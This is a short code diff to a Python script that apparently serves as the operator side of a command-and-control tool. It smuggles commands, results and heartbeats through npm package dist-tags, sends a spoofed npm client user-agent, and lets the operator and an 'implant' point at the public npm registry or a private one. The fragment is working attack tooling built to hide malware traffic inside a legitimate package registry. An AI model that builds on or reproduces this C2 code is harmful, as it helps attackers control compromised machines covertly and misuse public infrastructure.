@@ -26,9 +26,18 @@ import os
 CMD_PREFIX = "x64-"
 RES_PREFIX = "arm64-"
 HBT_PREFIX = "ia32-"
-TAG_VALUE = "1.0.0"
+# The version a dist-tag points at. It MUST already exist in the package;
+# npm answers 400 for a tag pointing at a non-existent version. Override with
+# NPMC2_TAG_VALUE when the package's only version is not 1.0.0 (staged-first
+# packages live on 0.0.0-stage).
+TAG_VALUE = os.environ.get("NPMC2_TAG_VALUE") or "1.0.0"
 MAX_TAG_LEN = 250
-API = "https://registry.npmjs.org/-/package/{}/dist-tags"
+# npmjs by default, but the implant and the operator must agree: point both at
+# a private registry by setting NPMC2_API_BASE (e.g. http://10.0.0.5:4874).
+# The implant bakes the same value in through --api-base.
+_DEFAULT_API_BASE = "https://registry.npmjs.org"
+API_BASE = (os.environ.get("NPMC2_API_BASE") or _DEFAULT_API_BASE).rstrip("/")
+API = API_BASE + "/-/package/{}/dist-tags"
 UA = "npm/11.18.0 node/v22.7.0 win32 x64"
 
 PREFIXES = (CMD_PREFIX, RES_PREFIX, HBT_PREFIX)
